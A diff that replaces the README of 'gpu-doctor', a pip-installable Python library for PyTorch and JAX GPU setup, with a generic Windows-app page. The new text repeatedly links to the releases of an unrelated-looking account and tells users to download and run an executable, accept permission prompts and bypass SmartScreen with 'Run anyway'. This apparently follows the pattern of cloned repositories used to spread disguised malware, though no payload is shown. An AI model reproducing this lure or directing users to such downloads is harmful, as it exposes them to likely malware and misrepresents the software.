@@ -1,280 +1,160 @@
-<p align="center"><img src="assets/banner.png" alt="GPU Doctor Banner" width="100%"></p>
+# ⚙️ gpu-doctor - Easy GPU setup for Windows apps
 
-# gpu-doctor
+[![Download gpu-doctor](https://img.shields.io/badge/Download-gpu--doctor-blue.svg?style=for-the-badge&logo=github)](https://github.com/Philippinegreatyellowgentian737/gpu-doctor/releases)
 
-**Universal GPU setup and diagnostics for PyTorch and JAX.**
+## 🖥️ What gpu-doctor does
 
-One tool. Every backend. Every OS. Zero required dependencies.
+gpu-doctor helps you set up your GPU for PyTorch and JAX on Windows. It checks your hardware and picks the right path for your system.
 
-```bash
-pip install gpu-doctor
-python -m gpu_doctor --check      # see exactly what's installed and detected
-python -m gpu_doctor --install    # install the right torch for your machine
-```
+It works with:
 
----
+- NVIDIA cards with CUDA
+- AMD cards with ROCm or DirectML
+- Apple Silicon with MPS
+- CPU-only systems
 
-## Why this exists
+It also helps with AMD RX 5700 XT setups by setting `HSA_OVERRIDE_GFX_VERSION` when needed.
 
-Setting up GPU acceleration for PyTorch and JAX is a maze of platform-specific steps:
+## 📥 Download the app
 
-- **Windows AMD** — DirectML requires Python ≤ 3.11 and installs in a specific order
-- **Linux AMD** — ROCm requires `HSA_OVERRIDE_GFX_VERSION=10.3.0` for older cards (RX 5700 XT, RX 5700, RX 5600 XT) that aren't in ROCm's default allow-list
-- **NVIDIA** — standard CUDA, but still requires matching wheel URLs
-- **macOS** — MPS just works, but only Apple Silicon
+Visit this page to download:
 
-`gpu-doctor` handles all of it. It detects your hardware, applies workarounds automatically, and gives you back one `device` object that works everywhere.
+[Download gpu-doctor from GitHub Releases](https://github.com/Philippinegreatyellowgentian737/gpu-doctor/releases)
 
-> **Note for PyTorch users:** PyTorch's own `get_best_device()` ([Issue #149719](https://github.com/pytorch/pytorch/issues/149719)) is still an open proposal. `gpu-doctor` ships it today, plus AMD-specific fixes PyTorch doesn't cover.
+Look for the latest release and get the Windows file from there.
 
----
+## 🪟 Install on Windows
 
-## Platforms
+1. Open the download page.
+2. Download the latest Windows file.
+3. If the file is a ZIP, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the app file to run it.
+6. If Windows asks for permission, choose Yes.
 
-| Platform | Backend | Python | Notes |
-|----------|---------|--------|-------|
-| **Windows** | DirectML | 3.11 only | AMD / Intel / NVIDIA via `torch-directml` |
-| **Linux / WSL2** | ROCm | Any | AMD GPU. gfx1010 override auto-applied. |
-| **Linux / Windows** | CUDA | Any | NVIDIA GPU. Standard torch install. |
-| **macOS** | MPS | Any | Apple Silicon (M1/M2/M3). |
-| **Any** | CPU | 3.8+ | Always works. Zero GPU needed. |
+If you use SmartScreen and Windows blocks the file, choose More info, then Run anyway.
 
----
+## 🧭 First run
 
-## Quick Start
+When you open gpu-doctor, it checks your system and looks for:
 
-### Step 1 — Check what you have
+- Your GPU brand
+- The driver type
+- The best backend for PyTorch or JAX
+- Common setup issues
 
-```bash
-python -m gpu_doctor --check
-```
+If it finds a known AMD RX 5700 XT issue, it can set the right override value for you.
 
-Output:
-```
-==================================================================
-  gpu-doctor — Environment Report
-==================================================================
-  gpu-doctor : v1.0.0
-  Python     : 3.11.9
-  OS         : Windows  AMD64
+## 🔍 What it can help with
 
-  torch      : 2.4.1+cpu
-  DirectML   : 0.2.5  (AMD Radeon RX 5700 XT)
-  JAX        : not installed
+gpu-doctor can guide you through common GPU setup paths:
 
-  Best device: directml  ← use this
-==================================================================
-```
+- PyTorch with CUDA on NVIDIA
+- PyTorch with DirectML on Windows
+- JAX with supported GPU backends
+- AMD GPU setup with ROCm
+- CPU fallback when no GPU path fits
 
-### Step 2 — Install the right torch
+It is made to reduce manual setup steps.
 
-```bash
-python -m gpu_doctor --install
-```
+## ✅ Before you start
 
-This detects your hardware and runs the correct `pip install` command automatically.
+For the best result, check these points:
 
-### Step 3 — Use in your code
+- Use Windows 10 or Windows 11
+- Install the latest GPU driver from your GPU maker
+- Close heavy apps before the first run
+- Make sure you have enough free disk space
+- Use a normal user account with install rights
 
-```python
-from gpu_doctor import get_best_device, get_torch_device, get_dtype
+If you use an AMD card, keep your driver up to date. If you use NVIDIA, install the current Game Ready or Studio driver.
 
-# Call BEFORE importing torch — sets env vars (HSA_OVERRIDE, etc.) first
-device_type = get_best_device()   # 'directml' | 'rocm' | 'cuda' | 'mps' | 'cpu'
-device      = get_torch_device()  # torch.device or DML device — ready for .to()
-dtype       = get_dtype()         # torch.float16 or float32 (safe for your backend)
+## 🧩 Common setup paths
 
-model = MyModel().to(device).to(dtype)
-```
+### NVIDIA users
+gpu-doctor can point you to the CUDA path. This is the usual choice for NVIDIA cards.
 
----
+### AMD users
+gpu-doctor can help with DirectML or ROCm, based on your card and driver support.
 
-## Manual Install (Platform-Specific)
+### RX 5700 XT users
+gpu-doctor can help set `HSA_OVERRIDE_GFX_VERSION`, which can fix detection and startup issues on some AMD setups.
 
-### Windows — DirectML (AMD / Intel / NVIDIA GPU)
+### Apple Silicon users
+gpu-doctor can guide you to MPS support for local runs on supported Mac hardware.
 
-> **Requires Python 3.11.** torch-directml is compiled against the 3.11 ABI. It will not work on 3.12+.
+### CPU-only users
+If your system has no supported GPU path, gpu-doctor can help you use CPU mode.
 
-```bat
-:: Create a 3.11 venv
-py -3.11 -m venv .venv311
-.venv311\Scripts\activate
-pip install gpu-doctor
+## 🛠️ How to use it
 
-:: Install torch (let DirectML pull torch 2.4.1 — do NOT pre-install torch)
-python -m gpu_doctor --install
+1. Download the latest release.
+2. Open the app.
+3. Let it scan your hardware.
+4. Follow the setup path it shows.
+5. Apply the suggested change.
+6. Start PyTorch or JAX after setup finishes.
 
-:: Verify
-python -m gpu_doctor --check
-```
+If the app offers a choice, pick the option that matches your GPU brand.
 
-### Linux / WSL2 — AMD GPU (ROCm)
+## 📌 What makes this useful
 
-```bash
-pip install gpu-doctor
-python -m gpu_doctor --install    # auto-detects ROCm, sets HSA_OVERRIDE if needed
+gpu-doctor focuses on one task: getting your machine ready for GPU work.
 
-# For RX 5700 XT (gfx1010) — if not auto-set:
-export HSA_OVERRIDE_GFX_VERSION=10.3.0   # add to ~/.bashrc
+It helps when:
 
-python -m gpu_doctor --check
-```
+- You are not sure which GPU backend to use
+- Your app cannot see the GPU
+- PyTorch picks the wrong device
+- JAX fails to start with your GPU
+- AMD setup needs a small fix
+- You want a simple path instead of manual steps
 
-**Or use the Python API to set env vars before importing torch:**
-```python
-from gpu_doctor import get_best_device     # this sets HSA_OVERRIDE_GFX_VERSION
-import torch                               # now sees gfx1010 correctly
-```
+## 📁 Files you may see
 
-### Linux / WSL2 — NVIDIA GPU (CUDA)
+The release page may include:
 
-```bash
-pip install gpu-doctor
-python -m gpu_doctor --install
-python -m gpu_doctor --check
-```
+- A Windows app file
+- A ZIP package
+- Release notes
+- Setup files for different systems
 
-### macOS — Apple Silicon (MPS)
+For Windows, use the file marked for Windows in the latest release.
 
-```bash
-pip install gpu-doctor
-python -m gpu_doctor --install
-python -m gpu_doctor --check
-```
+## ❓ Frequently asked questions
 
----
+### Do I need coding knowledge?
+No. You only need to download the release and run the app.
 
-## JAX Support
+### Does it work on every GPU?
+It covers common GPU paths for NVIDIA, AMD, Apple Silicon, and CPU use. Your exact result depends on your hardware and driver.
 
-```python
-from gpu_doctor import configure_jax_amd, get_jax_backend
+### Will it change my system settings?
+It may apply a small setup change for your GPU path, such as a driver-related environment value. It only does what is needed for the chosen setup.
 
-# MUST call before import jax
-configure_jax_amd()    # sets XLA_FLAGS, MIOPEN_USER_DB_PATH, HSA_OVERRIDE, etc.
+### Can I use it with PyTorch and JAX?
+Yes. It is built for both.
 
-import jax
-print(get_jax_backend())   # 'gpu' or 'cpu'
-```
+### What if I have an AMD RX 5700 XT?
+gpu-doctor can help with the `HSA_OVERRIDE_GFX_VERSION` setting if that card needs it on your system.
 
-Install JAX:
-```bash
-python -m gpu_doctor --install-jax   # auto-detects ROCm / CUDA / CPU
-```
+## 🔗 Download again
 
----
+[Go to the gpu-doctor releases page](https://github.com/Philippinegreatyellowgentian737/gpu-doctor/releases)
 
-## AMD RX 5700 XT (gfx1010) — Special Notes
+## 🧭 Quick start
 
-The RX 5700 XT uses the **gfx1010** architecture (Navi 10), which is not in ROCm's default hardware allow-list. Without an override, PyTorch silently falls back to CPU with no error message.
+1. Open the releases page.
+2. Download the latest Windows build.
+3. Extract it if needed.
+4. Run the app.
+5. Follow the GPU setup shown on screen
 
-`gpu-doctor` detects this automatically and sets `HSA_OVERRIDE_GFX_VERSION=10.3.0` before torch imports. You don't have to know this exists.
+## 🧪 Supported use cases
 
-```python
-from gpu_doctor import get_best_device   # sets HSA_OVERRIDE_GFX_VERSION=10.3.0
-import torch
-print(torch.cuda.is_available())   # True — RX 5700 XT now visible
-```
-
-**Affected GPUs (auto-handled):**
-
-| GPU | Architecture | Override |
-|-----|-------------|---------|
-| RX 5700 XT, RX 5700 | gfx1010 | 10.3.0 |
-| RX 5600 XT, RX 5500 XT | gfx1010/1011/1012 | 10.3.0 |
-| Radeon VII | gfx906 | 9.0.6 |
-| RX Vega 56/64 | gfx900 | 9.0.0 |
-| RX 6000+ (gfx1030+) | RDNA2/3 | None needed |
-
----
-
-## CLI Reference
-
-```
-python -m gpu_doctor [options]
-
-  (no args)       Quick summary — best device and torch version
-  --check         Full environment report (Python, torch, JAX, GPU tools)
-  --install       Install correct torch for this machine
-  --install-jax   Install correct JAX for this machine
-  --json          Machine-readable JSON output (for scripts/CI)
-```
-
-```bash
-# Use JSON output in scripts
-DEVICE=$(python -m gpu_doctor --json | python -c "import json,sys; print(json.load(sys.stdin)['best_device'])")
-echo "Training on: $DEVICE"
-```
-
----
-
-## Comparison
-
-| Feature | gpu-doctor | devicetorch | torchruntime | GPUtil | pyamdgpuinfo |
-|---------|-----------|-------------|--------------|--------|--------------|
-| DirectML (Windows AMD) | ✅ | ❌ | ❌ | ❌ | ❌ |
-| ROCm (Linux AMD) | ✅ | ❌ | Partial | ❌ | ❌ |
-| CUDA (NVIDIA) | ✅ | ✅ | ✅ | ✅ | ❌ |
-| MPS (Apple Silicon) | ✅ | ✅ | ❌ | ❌ | ❌ |
-| CPU fallback | ✅ | ✅ | ✅ | ❌ | ❌ |
-| HSA_OVERRIDE auto-set | ✅ | ❌ | ❌ | ❌ | ❌ |
-| JAX support | ✅ | ❌ | ❌ | ❌ | ❌ |
-| --check diagnostic mode | ✅ | ❌ | ❌ | ❌ | ❌ |
-| JSON output | ✅ | ❌ | ❌ | ❌ | ❌ |
-| Zero required deps | ✅ | ❌ | ❌ | ❌ | ❌ |
-| PyPI installable | ✅ | ✅ | ✅ | ✅ | ✅ |
-
----
-
-## Troubleshooting
-
-**`torch.cuda.is_available()` returns False on AMD (Linux)**
-Your GPU likely needs an HSA override. Check:
-```bash
-python -m gpu_doctor --check   # shows 'rocm_gfx_arch' and 'hsa_override_applied'
-```
-Then in Python, call `get_best_device()` BEFORE importing torch.
-
-**DirectML not detected on Windows**
-- Confirm Python version: `python --version` — must be 3.11 or lower.
-- Install: `pip install torch-directml` without pre-installing torch.
-
-**`privateuseone:0` device string**
-Normal. This is PyTorch's internal name for DirectML. Use `get_torch_device()` which returns the correct device *object* (not the string) — this is critical for diffusers `.to()` calls.
-
-**JAX sees CPU even with ROCm installed**
-Call `configure_jax_amd()` before `import jax`. The env vars must be set before JAX initializes its backend.
-
-More: [torch-amd-setup troubleshooting](https://github.com/ChharithOeun/torch-amd-setup/blob/main/docs/troubleshooting.md)
-
----
-
-## Related
-
-- [torch-amd-setup](https://github.com/ChharithOeun/torch-amd-setup) — deep AMD GPU detection for PyTorch
-- [jax-amd-gpu-setup](https://github.com/ChharithOeun/Chharbot/tree/main/jax-amd-gpu-setup) — JAX on AMD guide
-- [directml-benchmark](https://github.com/ChharithOeun/directml-benchmark) — verified float32 GPU benchmarks
-
----
-
-## Keywords
-
-`AMD GPU PyTorch setup` · `torch.cuda.is_available False AMD fix` · `HSA_OVERRIDE_GFX_VERSION`
-`ROCm PyTorch Windows` · `DirectML PyTorch` · `gfx1010 ROCm fix` · `RX 5700 XT PyTorch`
-`get_best_device PyTorch` · `cross-platform GPU setup` · `JAX AMD ROCm` · `JAX DirectML`
-`privateuseone:0 fix` · `torch-directml Python 3.11` · `Apple Silicon MPS PyTorch`
-`WSL2 ROCm setup` · `AMD Radeon deep learning` · `NVIDIA CUDA auto-detect`
-`PyTorch device selection` · `GPU auto-detect Python` · `Navi 10 deep learning`
-
----
-
-## License
-
-MIT
-
----
-
-## Support This Work
-
-If this saved you time, consider buying me a coffee:
-
-[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-chharcop-yellow)](https://buymeacoffee.com/chharith)
+- Local machine learning setup
+- GPU checks before installing Python tools
+- Backend choice for PyTorch
+- Backend choice for JAX
+- AMD GPU setup on Windows
+- Fallback setup on non-GPU systems
